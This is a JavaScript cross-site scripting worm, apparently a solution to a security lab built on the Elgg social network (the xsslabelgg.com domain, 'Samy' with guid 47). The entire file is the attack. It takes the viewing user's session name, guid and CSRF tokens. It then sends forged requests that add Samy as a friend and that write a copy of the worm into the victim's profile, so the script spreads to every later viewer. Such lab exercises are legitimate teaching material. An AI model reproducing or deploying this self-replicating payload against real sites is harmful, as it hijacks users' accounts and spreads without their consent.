<script id="worm">
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    window.onload = function () {
        edit_profile(wormCode);
        add_friend();
    }
    function add_friend() {
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend. 
        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token; //FILL IN
        //Create and send Ajax request to add friend 
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();
    }
    function edit_profile(wc) {
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts 
        //and Security Token __elgg_token
        var userName = elgg.session.user.name;
        var guid = "&guid=" + elgg.session.user.guid;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        var jscode = wc;
        var description = "&description=" + jscode;
        var accesslevel = "&accesslevel[description]=2";
        //Construct the content of your url.
        var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
        var content = "name=" + userName + guid + ts + token + description + accesslevel; //FILL IN
        var samyGuid = 47; //FILL IN
        if (elgg.session.user.guid != samyGuid) {
            //Create and send Ajax request to modify profile 
            var Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>